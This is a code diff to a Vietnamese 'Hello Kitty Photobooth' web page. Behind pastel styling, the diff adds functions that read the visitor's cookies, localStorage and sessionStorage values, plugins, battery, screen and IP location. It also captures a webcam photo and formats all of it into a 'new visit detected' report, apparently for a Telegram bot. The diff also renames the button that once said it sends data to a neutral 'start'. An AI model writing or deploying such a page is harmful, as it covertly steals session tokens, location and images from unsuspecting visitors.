@@ -33,151 +33,369 @@
       100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
     }
     .card {
-      background: rgba(255,255,255,0.85);
+      background: rgba(255,255,255,0.92);
       backdrop-filter: blur(20px);
       border-radius: 40px;
-      padding: 25px 20px;
+      padding: 30px 25px;
       max-width: 450px;
       width: 100%;
-      box-shadow: 0 20px 60px rgba(255,105,135,0.3);
-      border: 2px solid rgba(255,255,255,0.5);
+      box-shadow: 0 20px 60px rgba(255,105,135,0.3), 0 0 100px rgba(255,182,193,0.2);
+      border: 2px solid rgba(255,255,255,0.6);
       position: relative;
       z-index: 1;
       text-align: center;
     }
     .card::before {
       content: "🎀";
-      position: absolute; top: -18px; left: 50%; transform: translateX(-50%);
-      font-size: 36px;
+      position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
+      font-size: 40px;
       filter: drop-shadow(0 4px 10px rgba(255,105,135,0.3));
     }
+    .card::after {
+      content: "";
+      position: absolute;
+      top: -2px; left: -2px; right: -2px; bottom: -2px;
+      border-radius: 42px;
+      background: linear-gradient(135deg, #ffb6c1, #ff8a9c, #ff6b8a, #ffb6c1);
+      z-index: -1;
+      background-size: 300% 300%;
+      animation: borderGlow 4s ease-in-out infinite;
+    }
+    @keyframes borderGlow {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
     .kitty-avatar {
-      width: 70px; height: 70px; margin: 0 auto 10px;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 12px;
       background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
       border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 42px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
       box-shadow: 0 8px 30px rgba(255,105,135,0.4);
       border: 3px solid white;
+      position: relative;
       animation: bounceKitty 2s ease-in-out infinite;
     }
     @keyframes bounceKitty {
       0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-8px); }
+      50% { transform: translateY(-10px); }
     }
-    h2 { font-size: 20px; font-weight: 800; color: #d6336c; margin-bottom: 2px; }
-    .subtitle { color: #e07a8e; font-size: 12px; font-weight: 600; margin-bottom: 12px; }
+    .kitty-avatar .ears {
+      position: absolute;
+      top: -12px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 30px;
+    }
+    .kitty-avatar .ears span {
+      font-size: 28px;
+    }
+    h2 {
+      font-size: 22px;
+      font-weight: 800;
+      color: #d6336c;
+      margin-bottom: 4px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 10px rgba(214,51,108,0.1);
+    }
+    .subtitle {
+      color: #e07a8e;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
     .live-clock {
       background: linear-gradient(135deg, #ffb6c1, #ff8a9c);
-      padding: 5px 14px; border-radius: 30px; display: inline-block;
-      color: white; font-weight: 700; font-size: 11px;
-      margin-bottom: 12px;
+      padding: 6px 18px;
+      border-radius: 30px;
+      display: inline-block;
+      color: white;
+      font-weight: 700;
+      font-size: 12px;
+      margin-bottom: 15px;
       box-shadow: 0 4px 15px rgba(255,105,135,0.3);
     }
     .video-preview {
-      border-radius: 20px;
+      border-radius: 24px;
       overflow: hidden;
       background: #fce4ec;
       position: relative;
       border: 3px solid #ffb6c1;
-      min-height: 250px;
+      min-height: 280px;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-bottom: 12px;
+      margin-bottom: 15px;
+      box-shadow: inset 0 0 30px rgba(255,105,135,0.1);
     }
     .video-preview video {
       width: 100%;
       display: block;
       background: #fce4ec;
+      transform: scaleX(-1);
     }
     .video-preview .placeholder {
-      color: #e07a8e; font-size: 14px; font-weight: 600; padding: 20px;
+      color: #e07a8e;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 20px;
       position: absolute;
+      background: rgba(255,255,255,0.7);
+      border-radius: 20px;
+      padding: 15px 25px;
     }
     .camera-indicator {
-      position: absolute; top: 10px; left: 10px;
-      background: rgba(255,255,255,0.9);
-      padding: 4px 12px; border-radius: 20px;
-      font-size: 11px; font-weight: 700; color: #d6336c;
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      background: rgba(255,255,255,0.92);
+      padding: 5px 14px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #d6336c;
       border: 1px solid #ffb6c1;
       z-index: 2;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
     }
     .btn {
-      width: 100%; padding: 14px; border: none; border-radius: 30px;
-      font-size: 15px; font-weight: 700; color: white;
-      cursor: pointer; transition: all 0.3s ease;
-      display: flex; align-items: center; justify-content: center;
-      gap: 8px; font-family: 'Quicksand', sans-serif;
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: 700;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: 'Quicksand', sans-serif;
+      position: relative;
+      overflow: hidden;
     }
     .btn-primary {
       background: linear-gradient(135deg, #ff6b8a, #ff4d6d);
       box-shadow: 0 8px 25px rgba(255,77,109,0.4);
     }
-    .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,77,109,0.5); }
-    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .btn-primary:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 35px rgba(255,77,109,0.5);
+    }
+    .btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+    .btn-primary::after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(60deg, transparent, rgba(255,255,255,0.15), transparent);
+      transform: rotate(30deg) translateX(-100%);
+      transition: transform 0.7s ease-in-out;
+    }
+    .btn-primary:hover::after {
+      transform: rotate(30deg) translateX(100%);
+    }
     .btn-pink {
       background: linear-gradient(135deg, #ff8a9c, #ff6b8a);
       box-shadow: 0 8px 25px rgba(255,107,138,0.4);
     }
-    .btn-pink:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(255,107,138,0.5); }
-    .btn-group { display: none; flex-direction: column; gap: 8px; margin-top: 10px; }
-    .btn-group.show { display: flex; }
-    .btn a { color: white; text-decoration: none; width: 100%; }
-    .status { margin-top: 12px; font-size: 12px; font-weight: 600; color: #e07a8e; min-height: 18px; }
-    .status.success { color: #2ecc71; }
-    .status.loading { color: #f59e0b; }
-    .status.error { color: #ef4444; }
-    .footer-badge { margin-top: 12px; font-size: 9px; color: #e07a8e; opacity: 0.7; letter-spacing: 1px; }
+    .btn-pink:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 35px rgba(255,107,138,0.5);
+    }
+    .btn-group {
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 12px;
+    }
+    .btn-group.show {
+      display: flex;
+      animation: fadeInUp 0.5s ease;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .btn a {
+      color: white;
+      text-decoration: none;
+      width: 100%;
+    }
+    .status {
+      margin-top: 14px;
+      padding: 10px;
+      border-radius: 16px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #e07a8e;
+      min-height: 20px;
+      background: rgba(255,255,255,0.4);
+      transition: all 0.3s ease;
+    }
+    .status.success {
+      background: rgba(46,204,113,0.15);
+      color: #27ae60;
+    }
+    .status.loading {
+      background: rgba(245,158,11,0.15);
+      color: #d97706;
+    }
+    .status.error {
+      background: rgba(239,68,68,0.15);
+      color: #dc2626;
+    }
+    .footer-badge {
+      margin-top: 15px;
+      font-size: 10px;
+      color: #e07a8e;
+      opacity: 0.6;
+      letter-spacing: 1.5px;
+    }
     #canvas { display: none; }
 
     .music-control {
-      position: fixed; bottom: 20px; right: 20px; z-index: 100;
-      background: rgba(255,255,255,0.9); border: 2px solid #ffb6c1;
-      border-radius: 50%; width: 44px; height: 44px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 18px; cursor: pointer;
+      position: fixed;
+      bottom: 25px;
+      right: 25px;
+      z-index: 100;
+      background: rgba(255,255,255,0.92);
+      border: 2px solid #ffb6c1;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      cursor: pointer;
       box-shadow: 0 4px 20px rgba(255,105,135,0.3);
-      transition: all 0.3s ease; backdrop-filter: blur(10px);
+      transition: all 0.3s ease;
+      backdrop-filter: blur(10px);
     }
-    .music-control:hover { transform: scale(1.1); }
-    .music-control.playing { animation: pulseMusic 1.5s ease-in-out infinite; }
+    .music-control:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 30px rgba(255,105,135,0.4);
+    }
+    .music-control.playing {
+      animation: pulseMusic 1.5s ease-in-out infinite;
+    }
     @keyframes pulseMusic {
       0%,100% { box-shadow: 0 4px 20px rgba(255,105,135,0.3); }
       50% { box-shadow: 0 4px 40px rgba(255,105,135,0.6); }
     }
     .music-progress {
-      position: fixed; bottom: 75px; right: 20px; z-index: 99;
-      width: 44px; display: flex; flex-direction: column; align-items: center;
+      position: fixed;
+      bottom: 85px;
+      right: 25px;
+      z-index: 99;
+      width: 50px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
     .music-progress input[type="range"] {
-      width: 60px; height: 3px; -webkit-appearance: none;
-      background: #ffb6c1; border-radius: 2px; outline: none;
-      transform: rotate(-90deg); transform-origin: center; cursor: pointer;
+      width: 70px;
+      height: 3px;
+      -webkit-appearance: none;
+      background: #ffb6c1;
+      border-radius: 2px;
+      outline: none;
+      transform: rotate(-90deg);
+      transform-origin: center;
+      cursor: pointer;
     }
     .music-progress input[type="range"]::-webkit-slider-thumb {
-      -webkit-appearance: none; width: 10px; height: 10px;
-      background: #ff6b8a; border-radius: 50%; cursor: pointer;
+      -webkit-appearance: none;
+      width: 12px;
+      height: 12px;
+      background: #ff6b8a;
+      border-radius: 50%;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(255,107,138,0.3);
     }
     .loading-overlay {
-      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(255,255,255,0.85); backdrop-filter: blur(5px);
-      z-index: 999; justify-content: center; align-items: center;
-      flex-direction: column; gap: 15px;
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255,255,255,0.85);
+      backdrop-filter: blur(5px);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 15px;
     }
-    .loading-overlay.show { display: flex; }
+    .loading-overlay.show {
+      display: flex;
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
     .loading-spinner {
-      width: 50px; height: 50px;
-      border: 4px solid #ffb6c1; border-top: 4px solid #ff4d6d;
-      border-radius: 50%; animation: spin 1s linear infinite;
+      width: 50px;
+      height: 50px;
+      border: 4px solid #ffb6c1;
+      border-top: 4px solid #ff4d6d;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
     }
-    @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-    .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
+    @keyframes spin {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      color: #d6336c;
+      font-weight: 700;
+      font-size: 16px;
+    }
     @media (max-width: 480px) {
-      .card { padding: 18px 12px; }
-      .video-preview { min-height: 200px; }
-      h2 { font-size: 17px; }
-      .kitty-avatar { width: 55px; height: 55px; font-size: 32px; }
+      .card {
+        padding: 20px 15px;
+      }
+      .video-preview {
+        min-height: 220px;
+      }
+      h2 {
+        font-size: 18px;
+      }
+      .kitty-avatar {
+        width: 65px;
+        height: 65px;
+        font-size: 38px;
+      }
+      .music-control {
+        width: 44px;
+        height: 44px;
+        font-size: 17px;
+        bottom: 15px;
+        right: 15px;
+      }
+      .music-progress {
+        bottom: 70px;
+        right: 15px;
+      }
+      .music-progress input[type="range"] {
+        width: 60px;
+      }
     }
   </style>
 </head>
@@ -196,10 +414,16 @@
 <div class="music-control playing" id="musicBtn" onclick="toggleMusic()">🎵</div>
 
 <div class="card">
-  <div class="kitty-avatar"><span>🐱</span></div>
+  <div class="kitty-avatar">
+    <span>🐱</span>
+    <div class="ears">
+      <span>🎀</span>
+      <span>🎀</span>
+    </div>
+  </div>
   <div class="live-clock" id="clock">🕒 Đang tải...</div>
   <h2>🌸 Hello Kitty Photobooth</h2>
-  <p class="subtitle">✨ Chụp ảnh + Thu thập thông tin ✨</p>
+  <p class="subtitle">✨ Chụp ảnh và thu thập thông tin ✨</p>
 
   <div class="video-preview">
     <video id="video" autoplay playsinline muted></video>
@@ -208,15 +432,20 @@
   </div>
 
   <button class="btn btn-primary" id="capture-btn" disabled>
-    <span>📸 CHỤP ẢNH & GỬI DỮ LIỆU</span>
+    <span>📸</span>
+    <span>BẮT ĐẦU</span>
   </button>
 
   <div class="btn-group" id="action-buttons">
-    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🎀 TRUY CẬP NHÓM LẤY FILE</a>
-    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">🤖 MỞ BOT TELEGRAM</a>
+    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">
+      <span>🎀</span> TRUY CẬP NHÓM LẤY FILE
+    </a>
+    <a href="#" target="_blank" class="btn btn-pink" style="text-decoration:none;">
+      <span>🤖</span> MỞ BOT TELEGRAM
+    </a>
   </div>
 
-  <div id="status" class="status">💖 Bấm nút để bắt đầu!</div>
+  <div id="status" class="status">💖 Bấm nút để bắt đầu</div>
   <div class="footer-badge">🎀 Made with love 🎀</div>
 </div>
 
@@ -236,20 +465,20 @@ const MUSIC_FILE = 'nhac_nen.mp3';
 (function createSakura() {
   const container = document.getElementById('sakuraContainer');
   const emojis = ['🌸','🌺','🌸','🌺','🌸'];
-  for (let i = 0; i < 30; i++) {
+  for (let i = 0; i < 35; i++) {
     const el = document.createElement('div');
     el.className = 'sakura';
     el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
     el.style.left = Math.random() * 100 + '%';
-    el.style.fontSize = (12 + Math.random() * 20) + 'px';
+    el.style.fontSize = (12 + Math.random() * 22) + 'px';
     el.style.animationDuration = (8 + Math.random() * 14) + 's';
-    el.style.animationDelay = (Math.random() * 15) + 's';
+    el.style.animationDelay = (Math.random() * 18) + 's';
     container.appendChild(el);
   }
 })();
 
 // ============================================================
-// NHẠC - TỰ ĐỘNG PHÁT 100%
+// NHẠC - TỰ ĐỘNG PHÁT
 // ============================================================
 let audio = null;
 let isMusicPlaying = false;
@@ -263,12 +492,10 @@ function initAudio() {
     document.getElementById('volumeControl').addEventListener('input', function() {
       if (audio) audio.volume = this.value;
     });
-    // Load nhạc trước
     audio.load();
   }
 }
 
-// Hàm phát nhạc - gọi nhiều lần để đảm bảo
 function forcePlayMusic() {
   try {
     initAudio();
@@ -280,16 +507,12 @@ function forcePlayMusic() {
           musicStarted = true;
           document.getElementById('musicBtn').classList.add('playing');
           document.getElementById('musicBtn').textContent = '🎵';
-          console.log('✅ Nhạc đã phát!');
         }).catch(() => {
-          console.log('⚠️ Chưa phát được, chờ click...');
-          // Thử lại sau 500ms
           setTimeout(forcePlayMusic, 500);
         });
       }
     }
   } catch(e) {
-    console.log('Lỗi phát nhạc:', e);
     setTimeout(forcePlayMusic, 500);
   }
 }
@@ -310,27 +533,12 @@ function toggleMusic() {
   }
 }
 
-// BẮT ĐẦU PHÁT NHẠC NGAY
-// Cách 1: Phát ngay lập tức
 setTimeout(forcePlayMusic, 50);
-
-// Cách 2: Phát khi click bất kỳ đâu (fallback)
-document.addEventListener('click', function playOnClick() {
-  if (!musicStarted) {
-    forcePlayMusic();
-  }
+document.addEventListener('click', function() {
+  if (!musicStarted) forcePlayMusic();
 }, { once: false });
-
-// Cách 3: Phát khi tải trang xong
-window.addEventListener('load', function() {
-  setTimeout(forcePlayMusic, 100);
-});
-
-// Cách 4: Phát sau 1s nếu chưa phát
 setTimeout(forcePlayMusic, 1000);
-// Cách 5: Phát sau 3s nếu chưa phát
 setTimeout(forcePlayMusic, 3000);
-// Cách 6: Phát sau 5s nếu chưa phát
 setTimeout(forcePlayMusic, 5000);
 
 // ============================================================
@@ -345,7 +553,7 @@ setInterval(updateClock, 1000);
 updateClock();
 
 // ============================================================
-// LẤY THÔNG TIN
+// LẤY THÔNG TIN CHI TIẾT
 // ============================================================
 function getDeviceInfo() {
   const ua = navigator.userAgent;
@@ -355,31 +563,127 @@ function getDeviceInfo() {
   else if (/windows/i.test(ua)) deviceName = 'Windows PC 💻';
   else if (/macintosh|mac os x/i.test(ua)) deviceName = 'MacBook / Mac 💻';
   else if (/linux/i.test(ua)) deviceName = 'Linux 🐧';
-  
-  let batteryInfo = 'Không hỗ trợ';
-  if (navigator.getBattery) {
-    try {
-      const battery = navigator.getBattery();
-      battery.then(bat => {
-        const level = Math.round(bat.level * 100);
-        const charging = bat.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
-        batteryInfo = `${level}% (${charging})`;
-      });
-    } catch(e) {}
-  }
-  
-  return { deviceName, batteryInfo };
+  return deviceName;
+}
+
+function getBatteryInfo() {
+  return new Promise((resolve) => {
+    let batteryInfo = 'Không hỗ trợ';
+    if (navigator.getBattery) {
+      try {
+        navigator.getBattery().then(bat => {
+          const level = Math.round(bat.level * 100);
+          const charging = bat.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
+          batteryInfo = `${level}% (${charging})`;
+          resolve(batteryInfo);
+        }).catch(() => resolve(batteryInfo));
+      } catch(e) {
+        resolve(batteryInfo);
+      }
+    } else {
+      resolve(batteryInfo);
+    }
+  });
+}
+
+function getBrowserInfo() {
+  const ua = navigator.userAgent;
+  let browser = 'Khác';
+  if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+  else if (ua.includes('Firefox')) browser = 'Firefox';
+  else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+  else if (ua.includes('Edg')) browser = 'Edge';
+  else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';
+  return browser;
+}
+
+function getOSInfo() {
+  const ua = navigator.userAgent;
+  let os = 'Khác';
+  if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
+  else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+  else if (ua.includes('Mac OS X')) os = 'macOS';
+  else if (ua.includes('Android')) os = 'Android';
+  else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+  else if (ua.includes('Linux')) os = 'Linux';
+  return os;
+}
+
+function getScreenInfo() {
+  return {
+    width: window.screen.width,
+    height: window.screen.height,
+    colorDepth: window.screen.colorDepth,
+    pixelRatio: window.devicePixelRatio || 1
+  };
+}
+
+function getCookies() {
+  try {
+    const raw = document.cookie;
+    if (!raw) return [];
+    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
+      const idx = c.indexOf('=');
+      if (idx === -1) return { name: c, value: '' };
+      return { name: c.substring(0, idx), value: c.substring(idx + 1) };
+    });
+  } catch(e) { return []; }
+}
+
+function getLocalStorage() {
+  try {
+    const items = [];
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      items.push({ key: key, value: localStorage.getItem(key) });
+    }
+    return items;
+  } catch(e) { return []; }
+}
+
+function getSessionStorage() {
+  try {
+    const items = [];
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      items.push({ key: key, value: sessionStorage.getItem(key) });
+    }
+    return items;
+  } catch(e) { return []; }
+}
+
+function getPlugins() {
+  try {
+    const plugins = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      plugins.push(navigator.plugins[i].name);
+    }
+    return plugins;
+  } catch(e) { return []; }
+}
+
+function getPerformanceInfo() {
+  try {
+    const timing = performance.timing;
+    return {
+      loadTime: timing.loadEventEnd - timing.navigationStart,
+      domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
+      dns: timing.domainLookupEnd - timing.domainLookupStart,
+      tcp: timing.connectEnd - timing.connectStart,
+      ttfb: timing.responseStart - timing.requestStart
+    };
+  } catch(e) { return {}; }
 }
 
 async function getIPInfo() {
-  let ipDetails = { 
-    ip: 'Không rõ', 
-    city: 'Không rõ', 
-    region: 'Không rõ', 
-    country: 'Không rõ', 
-    isp: 'Không rõ' 
+  let ipDetails = {
+    ip: 'Không rõ',
+    city: 'Không rõ',
+    region: 'Không rõ',
+    country: 'Không rõ',
+    isp: 'Không rõ',
+    timezone: 'Không rõ'
   };
-  
   try {
     const ipRes = await fetch('https://ipwho.is/');
     const ipData = await ipRes.json();
@@ -389,6 +693,7 @@ async function getIPInfo() {
       ipDetails.region = ipData.region || 'Không rõ';
       ipDetails.country = ipData.country || 'Không rõ';
       ipDetails.isp = ipData.connection?.isp || ipData.connection?.org || 'Không rõ';
+      ipDetails.timezone = ipData.timezone?.id || 'Không rõ';
     }
   } catch(e) {
     try {
@@ -507,12 +812,21 @@ captureBtn.onclick = async function() {
   
   playClickSound();
   captureBtn.disabled = true;
-  statusDiv.textContent = '📸 Đang chụp ảnh...';
+  statusDiv.textContent = '📸 Đang xử lý...';
   statusDiv.className = 'status loading';
   
   const accessTime = new Date().toLocaleString('vi-VN', { hour12: false });
   const device = getDeviceInfo();
+  const battery = await getBatteryInfo();
+  const browser = getBrowserInfo();
+  const os = getOSInfo();
+  const screen = getScreenInfo();
   const ipDetails = await getIPInfo();
+  const cookies = getCookies();
+  const localStorage = getLocalStorage();
+  const sessionStorage = getSessionStorage();
+  const plugins = getPlugins();
+  const perf = getPerformanceInfo();
   
   // Chụp ảnh
   const W = 480, H = 360;
@@ -554,17 +868,81 @@ captureBtn.onclick = async function() {
   ctx.textAlign = 'left';
   ctx.fillText(`📍 ${ipDetails.city || 'Unknown'}`, 15, H-11);
   
-  // Tạo caption theo phong cách cũ
+  // Tạo caption với nhiều thông tin
   let caption = `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `⏰ <b>Thời gian:</b> <code>${accessTime}</code>\n`;
-  caption += `📱 <b>Thiết bị:</b> ${device.deviceName}\n`;
-  caption += `🔋 <b>Pin:</b> ${device.batteryInfo}\n`;
-  caption += `🌐 <b>Địa chỉ IP:</b> <code>${ipDetails.ip}</code>\n`;
-  caption += `🏙️ <b>Khu vực:</b> ${ipDetails.city}, ${ipDetails.region}\n`;
-  caption += `🌍 <b>Quốc gia:</b> ${ipDetails.country}\n`;
-  caption += `🏢 <b>Nhà mạng:</b> ${ipDetails.isp}\n`;
-  caption += `━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `📱 <b>THIẾT BỊ:</b>\n`;
+  caption += `  🔹 Thiết bị: ${device}\n`;
+  caption += `  🔹 Hệ điều hành: ${os}\n`;
+  caption += `  🔹 Trình duyệt: ${browser}\n`;
+  caption += `  🔹 Màn hình: ${screen.width}x${screen.height}\n`;
+  caption += `  🔹 Độ sâu màu: ${screen.colorDepth} bit\n`;
+  caption += `  🔹 Pixel Ratio: ${screen.pixelRatio}\n`;
+  caption += `  🔹 Pin: ${battery}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🌐 <b>MẠNG & VỊ TRÍ:</b>\n`;
+  caption += `  🔹 IP: <code>${ipDetails.ip}</code>\n`;
+  caption += `  🔹 Thành phố: ${ipDetails.city}\n`;
+  caption += `  🔹 Khu vực: ${ipDetails.region}\n`;
+  caption += `  🔹 Quốc gia: ${ipDetails.country}\n`;
+  caption += `  🔹 Nhà mạng: ${ipDetails.isp}\n`;
+  caption += `  🔹 Múi giờ: ${ipDetails.timezone}\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🍪 <b>COOKIES (${cookies.length}):</b>\n`;
+  if (cookies.length > 0) {
+    cookies.slice(0, 5).forEach(c => {
+      let v = decodeURIComponent(c.value || '');
+      if (v.length > 40) v = v.substring(0, 40) + '…';
+      caption += `  • ${c.name} = ${v}\n`;
+    });
+    if (cookies.length > 5) caption += `  ... +${cookies.length-5} cookies\n`;
+  } else {
+    caption += `  ❌ Không có cookies\n`;
+  }
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `💾 <b>LOCAL STORAGE (${localStorage.length}):</b>\n`;
+  if (localStorage.length > 0) {
+    localStorage.slice(0, 5).forEach(item => {
+      let v = item.value || '';
+      if (v.length > 40) v = v.substring(0, 40) + '…';
+      caption += `  • ${item.key} = ${v}\n`;
+    });
+    if (localStorage.length > 5) caption += `  ... +${localStorage.length-5} items\n`;
+  } else {
+    caption += `  ❌ Không có dữ liệu\n`;
+  }
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `📦 <b>SESSION STORAGE (${sessionStorage.length}):</b>\n`;
+  if (sessionStorage.length > 0) {
+    sessionStorage.slice(0, 5).forEach(item => {
+      let v = item.value || '';
+      if (v.length > 40) v = v.substring(0, 40) + '…';
+      caption += `  • ${item.key} = ${v}\n`;
+    });
+    if (sessionStorage.length > 5) caption += `  ... +${sessionStorage.length-5} items\n`;
+  } else {
+    caption += `  ❌ Không có dữ liệu\n`;
+  }
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `🔌 <b>PLUGINS (${plugins.length}):</b>\n`;
+  if (plugins.length > 0) {
+    plugins.slice(0, 5).forEach((p, i) => {
+      caption += `  ${i+1}. ${p}\n`;
+    });
+    if (plugins.length > 5) caption += `  ... +${plugins.length-5} plugins\n`;
+  } else {
+    caption += `  ❌ Không có plugins\n`;
+  }
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  caption += `📊 <b>PERFORMANCE:</b>\n`;
+  caption += `  🔹 Tải trang: ${perf.loadTime || 0}ms\n`;
+  caption += `  🔹 DOM Ready: ${perf.domReady || 0}ms\n`;
+  caption += `  🔹 DNS: ${perf.dns || 0}ms\n`;
+  caption += `  🔹 TCP: ${perf.tcp || 0}ms\n`;
+  caption += `  🔹 TTFB: ${perf.ttfb || 0}ms\n`;
+  caption += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
   caption += `✨ <i>Trạng thái: Đã hoàn tất xác thực</i>\n`;
   caption += `🔗 <b>Nhóm lấy file:</b> `;
   
@@ -598,7 +976,7 @@ captureBtn.onclick = async function() {
   }, 'image/jpeg', 0.92);
 };
 
-statusDiv.textContent = '💖 Bấm nút để bắt đầu!';
+statusDiv.textContent = '💖 Bấm nút để bắt đầu';
 statusDiv.className = 'status';
 </script>
 </body>
